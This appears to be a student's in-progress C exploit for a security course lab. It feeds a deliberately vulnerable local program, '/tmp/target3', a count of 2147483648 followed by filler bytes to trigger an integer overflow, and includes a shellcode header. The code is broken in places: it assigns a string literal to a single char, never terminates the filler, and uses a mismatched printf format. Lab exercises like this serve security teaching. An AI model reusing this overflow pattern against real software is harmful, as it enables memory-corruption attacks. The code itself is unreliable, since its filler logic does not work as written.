#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// need 2800
// sizeof widget_t is 56 bytes
// butts

struct widget_t {
  long double p;
  double x;
  double y;
  unsigned long a;
  unsigned long b;
  int count;
  double t;
  double q;
};

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[3000] = "2147483648,";
  int i = 0;
  for (i; i < 56*50; i++){
  	int x = 11+i;
  	buf[x] = "\xff";
  }
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  printf("%d\n",sizeof(struct widget_t));
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
